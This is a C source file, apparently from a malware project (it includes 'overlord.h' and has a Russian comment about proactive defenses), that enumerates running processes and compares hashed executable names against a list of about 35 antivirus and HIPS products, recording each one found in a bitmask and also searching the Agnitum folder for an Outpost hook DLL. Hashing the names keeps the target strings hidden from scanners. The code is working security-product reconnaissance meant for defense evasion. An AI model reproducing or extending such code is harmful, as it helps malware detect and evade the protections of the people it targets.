#include "overlord.h"

#include <Tlhelp32.h>

#include "hipsinfo.h"

#define EKRN_EXE_HASH                0xd90a7896 // ekrn.exe  - ESET service process.
#define CCSVCHST_EXE_HASH            0x7ae72224 // ccSvcHst.exe - Symantec process.
#define SCHED_EXE_HASH               0x185ad196 // sched.exe - Avira Scheduler process.
#define AVP_EXE_HASH                 0x56028094 // avp.exe - Kaspersky Antivirus process.
#define AVASTSVC_EXE_HASH            0xfaab2424 // AvastSvc.exe - avast! Service.
#define MCSVHOST_EXE_HASH            0x3b0f2726 // McSvHost.exe - McAfee Service Host.
#define CMDAGENT_EXE_HASH            0xdb2f0321 // cmdagent.exe - COMODO Internet Security.
#define AVGWDSVC_EXE_HASH            0xba2b2825 // avgwdsvc.exe - AVG Watchdog Service.
#define AVGCSRVX_EXE_HASH            0x7bf31425 // avgcsrvx.exe - AVG Scanning Core Module - Server Part.
#define ACS_EXE_HASH                 0x56325a94 // acs.exe - Agnitum Outpost Service (Virus Buster).
#define DWSERVICE_EXE_HASH           0x3acf0829 // dwservice.exe - Dr.Web Control Service.
#define PFSVC_EXE_HASH               0xd862f098 // pfsvc.exe - Privatefirewall Network Service.
#define MSMPENG_EXE_HASH             0xbaa6dda3 // Antimalware Service Executable.
#define MSSECES_EXE_HASH             0x3b0ed1a3 // Microsoft Security Client User Interface.
#define ISWSVC_EXE_HASH              0xf8eaf3a5 // ZoneAlarm Browser Security.
#define PCTSSVC_EXE_HASH             0x3a8af4a5 // PC Tools Security Component.
#define JPF_EXE_HASH                 0x95627496 // jpf.exe - Jetico Personal Firewall Control Application.
#define BDAGENT_EXE_HASH             0xDB02D1A1 // bdagent.exe - Bitdefender Agent.
#define ADAWARESERVICE_EXE_HASH      0x23F5290D // AdAwareService.exe - Ad-Aware
#define ARCAMAINSV_EXE_HASH          0x5BF10D2C // ArcaMainSV.exe - ArcaVir
#define PSCTRLS_EXE_HASH             0xFB92CFA6 // PsCtrlS.exe - Panda
#define SAVSERVICE_EXE_HASH          0x0BB507A9 // SavService.exe - Performs virus scanning and disinfection functions.
#define SAVADMINSERVICE_EXE_HASH     0x601F28CE // SAVAdminService.exe - Sophos Admininistrator Service.
#define FSHOSTER32_EXE_HASH          0x27D2A2AE // fshoster32.exe - F-Secure Host Process
#define TPMGMA_EXE_HASH              0x587ADEA4 // tpmgma.exe - TrustPort Antivirus Management Agent
#define NPSVC32_EXE_HASH             0xD78A6DA2 // npsvc32.exe - Privacy Service.
#define INORT_EXE_HASH               0xD9B2E197 // InoRT.exe - eTrust Antivirus.
#define RSMGRSVC_EXE_HASH            0x7A8F20A6 // RsMgrSvc.exe - Rising
#define GUARDXSERVICE_EXE_HASH       0xE41A20EC // guardxservice.exe - GuardX Serivce (IKARUS)
#define SOLOSENT_EXE_HASH            0xDB971922 // SOLOSENT.EXE (Solo)
#define SOLOCFG_EXE_HASH             0xBAB6CCA2 // SOLOCFG.EXE (Solo)
#define TFSERVICE_EXE_HASH           0x3ACEFFAA // PCTool ThreatFire Serivce
#define BULLGUARDBHVSCANNER_EXE_HASH 0x92D2A910 // BullGuardBhvScanner - BullGuard Behavioural Scanner
#define CORESERVICESHELL_EXE_HASH    0xB009BBAE // CoreServiceShell.exe - Trend Micro Anti-Malware Solution Platform
#define K7TSMNGR_EXE_HASH            0x1A670B26 // K7TSMngr.exe - K7TotalSecurity Service Manager


#define PROACTIVE_NOT_CHECKED  0x4000000000000000ULL
#define PROACTIVE_NOT_DETECTED 0x8000000000000000ULL
#define HIPS_ESET       0x0000000000000001
#define HIPS_SYMANTEC   0x0000000000000002
#define HIPS_AVIRA      0x0000000000000004
#define HIPS_KASPERSKY  0x0000000000000008
#define HIPS_AVAST      0x0000000000000010
#define HIPS_MCAFEE     0x0000000000000020
#define HIPS_COMODO     0x0000000000000040
#define HIPS_AVG        0x0000000000000080
#define HIPS_OUTPOST    0x0000000000000100
#define HIPS_DRWEB      0x0000000000000200
#define HIPS_PRIVATEFW  0x0000000000000400
#define HIPS_MSE        0x0000000000000800
#define HIPS_ZONEALARM  0x0000000000001000
#define HIPS_PCTOOLS    0x0000000000002000
#define HIPS_JETICO     0x0000000000004000
#define HIPS_BDEFENDER  0x0000000000008000
#define HIPS_ADAWARE    0x0000000000010000
#define HIPS_ARCAVIR    0x0000000000020000
#define HIPS_PANDA      0x0000000000040000
#define HIPS_SOPHOS     0x0000000000080000
#define HIPS_FSECURE    0x0000000000100000
#define HIPS_TRUSTPORT  0x0000000000200000
#define HIPS_NORMAN     0x0000000000400000
#define HIPS_ETRUST     0x0000000000800000
#define HIPS_RISING     0x0000000001000000
#define HIPS_IKARUS     0x0000000002000000
#define HIPS_SOLO       0x0000000004000000
#define HIPS_THREATFIRE 0x0000000008000000
#define HIPS_BULLGUARD  0x0000000010000000
#define HIPS_TRENDMICRO 0x0000000020000000
#define HIPS_K7         0x0000000040000000

uint64_t gHipsMask;

BOOL ph_outpost_find_file(PWCHAR pwszPath, PWCHAR pwszFileName)
{
    WIN32_FIND_DATAW FindFileData;
    WCHAR wszSysPath[MAX_PATH];
    HANDLE hFind;

    __stosb((uint8_t*)wszSysPath, 0, MAX_PATH*2);
    lstrcpyW(wszSysPath,pwszPath);
    lstrcatW(wszSysPath,L"*");

    hFind = FindFirstFileW(wszSysPath, &FindFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        //INLOG("FindFile() FindFirstFileW = INVALID_HANDLE_VALUE!", GetLastError());
        return FALSE;
    } 
    else {
        do {
            //INLOGX(FindFileData.cFileName,0);
            if (FindFileData.cFileName[0] != L'.') {
                if(FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
                    __stosb((uint8_t*)wszSysPath, 0, MAX_PATH*2);
                    lstrcpyW(wszSysPath, pwszPath);
                    lstrcatW(wszSysPath, FindFileData.cFileName);
                    lstrcatW(wszSysPath, L"\\");
                    if (ph_outpost_find_file(wszSysPath, pwszFileName))
                        return TRUE;
                }
                else {
                    if (lstrcmpiW(FindFileData.cFileName,pwszFileName) == 0) {
                        return TRUE;
                    }
                }
            }
        } while (FindNextFileW(hFind, &FindFileData) != 0);

        FindClose(hFind);
    }

    return FALSE;
}

void ph_detect_outpost()
{
    WCHAR wszSysPath[MAX_PATH];
    HANDLE hOutpost;

    hOutpost = GetModuleHandleW(L"wl_hook.dll");
    if (hOutpost != NULL) {
        DBG_PRINTF(("Outpost detected with wl_hook.dll\n"));
        gHipsMask |= HIPS_OUTPOST;
        return;
    }

    //check 2
    GetEnvironmentVariableW(L"SystemDrive", wszSysPath, MAX_PATH);
    lstrcatW(wszSysPath, L"\\Program Files\\Agnitum\\");

    if (ph_outpost_find_file(wszSysPath, L"wl_hook.dll")) {
        DBG_PRINTF(("Outpost detected with wl_hook.dll\n"));
        gHipsMask |= HIPS_OUTPOST;
    }
}

int hipsinfo_update()
{
    int ret = 1;
    PROCESSENTRY32 processEntry;
    HANDLE hSnap;

    // Пробегаемся по списку процессов и ищем совпадения с известными именами файлов проактивных защит.
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &processEntry)) {
            do {
                uint32_t hashVal = utils_strihash(processEntry.szExeFile);
                switch (hashVal) {
                    case EKRN_EXE_HASH:
                        gHipsMask |= HIPS_ESET;
                        DBG_PRINTF(("ESET detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case CCSVCHST_EXE_HASH:
                        gHipsMask |= HIPS_SYMANTEC;
                        DBG_PRINTF(("Symantec detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case SCHED_EXE_HASH:
                        gHipsMask |= HIPS_AVIRA;
                        DBG_PRINTF(("Avira detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case AVP_EXE_HASH:
                        gHipsMask |= HIPS_KASPERSKY;
                        DBG_PRINTF(("KAV detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case AVASTSVC_EXE_HASH:
                        gHipsMask |= HIPS_AVAST;
                        DBG_PRINTF(("Avast detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case MCSVHOST_EXE_HASH:
                        gHipsMask |= HIPS_MCAFEE;
                        DBG_PRINTF(("McAfee detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case CMDAGENT_EXE_HASH:
                        gHipsMask |= HIPS_COMODO;
                        DBG_PRINTF(("COMODO detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case AVGWDSVC_EXE_HASH:
                    case AVGCSRVX_EXE_HASH:
                        gHipsMask |= HIPS_AVG;
                        DBG_PRINTF(("AVG detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case ACS_EXE_HASH:
                        gHipsMask |= HIPS_OUTPOST;
                        DBG_PRINTF(("Outpost detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case DWSERVICE_EXE_HASH:
                        gHipsMask |= HIPS_DRWEB;
                        DBG_PRINTF(("Dr.Web detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case PFSVC_EXE_HASH:
                        gHipsMask |= HIPS_PRIVATEFW;
                        DBG_PRINTF(("PrivateFirewall detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case MSMPENG_EXE_HASH:
                    case MSSECES_EXE_HASH:
                        gHipsMask |= HIPS_MSE;
                        DBG_PRINTF(("MSE detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case ISWSVC_EXE_HASH:
                        gHipsMask |= HIPS_ZONEALARM;
                        DBG_PRINTF(("ZoneAlarm detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case PCTSSVC_EXE_HASH:
                        gHipsMask |= HIPS_PCTOOLS;
                        DBG_PRINTF(("PC Tools detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case JPF_EXE_HASH:
                        gHipsMask |= HIPS_JETICO;
                        DBG_PRINTF(("Jetico detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case BDAGENT_EXE_HASH:
                        gHipsMask |= HIPS_BDEFENDER;
                        DBG_PRINTF(("BitDefender detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case ADAWARESERVICE_EXE_HASH:
                        gHipsMask |= HIPS_ADAWARE;
                        DBG_PRINTF(("Ad-Aware detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case ARCAMAINSV_EXE_HASH:
                        gHipsMask |= HIPS_ARCAVIR;
                        DBG_PRINTF(("ArcaVir detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case PSCTRLS_EXE_HASH:
                        gHipsMask |= HIPS_PANDA;
                        DBG_PRINTF(("Panda detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case SAVSERVICE_EXE_HASH:
                    case SAVADMINSERVICE_EXE_HASH:
                        gHipsMask |= HIPS_SOPHOS;
                        DBG_PRINTF(("Sophos detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case FSHOSTER32_EXE_HASH:
                        gHipsMask |= HIPS_FSECURE;
                        DBG_PRINTF(("F-Secure detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case TPMGMA_EXE_HASH:
                        gHipsMask |= HIPS_TRUSTPORT;
                        DBG_PRINTF(("TrustPort detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case NPSVC32_EXE_HASH:
                        gHipsMask |= HIPS_NORMAN;
                        DBG_PRINTF(("Norman detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case INORT_EXE_HASH:
                        gHipsMask |= HIPS_ETRUST;
                        DBG_PRINTF(("eTrust detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case RSMGRSVC_EXE_HASH:
                        gHipsMask |= HIPS_RISING;
                        DBG_PRINTF(("Rising detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case GUARDXSERVICE_EXE_HASH:
                        gHipsMask |= HIPS_IKARUS;
                        DBG_PRINTF(("IKARUS detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case SOLOSENT_EXE_HASH:
                    case SOLOCFG_EXE_HASH:
                        gHipsMask |= HIPS_SOLO;
                        DBG_PRINTF(("SoloAV detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case TFSERVICE_EXE_HASH:
                        gHipsMask |= HIPS_THREATFIRE;
                        DBG_PRINTF(("ThreatFire detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case BULLGUARDBHVSCANNER_EXE_HASH:
                        gHipsMask |= HIPS_BULLGUARD;
                        DBG_PRINTF(("BullGuard detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case CORESERVICESHELL_EXE_HASH:
                        gHipsMask |= HIPS_TRENDMICRO;
                        DBG_PRINTF(("TrendMicro detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                    case K7TSMNGR_EXE_HASH:
                        gHipsMask |= HIPS_K7;
                        DBG_PRINTF(("K7 detected (PID: %u)\n", processEntry.th32ProcessID));
                        break;
                }
            } while(Process32Next(hSnap, &processEntry));
        }
        else {
            DBG_PRINTF(("hipsinfo_update: Process32First failed with %08X\n", GetLastError()));
            ret = 0;
        }
        CloseHandle(hSnap);
    }
    else {
        DBG_PRINTF(("hipsinfo_update: CreateToolhelp32Snapshot failed with %08X\n", GetLastError()));
        ret = 0;
    }

    if (gHipsMask == 0ULL) {
        ph_detect_outpost();
    }

    if (gHipsMask == 0ULL) {
        gHipsMask = 0x8000000000000000ULL;
        DBG_PRINTF(("HIPS not found!\n"));
    }
    return ret;
}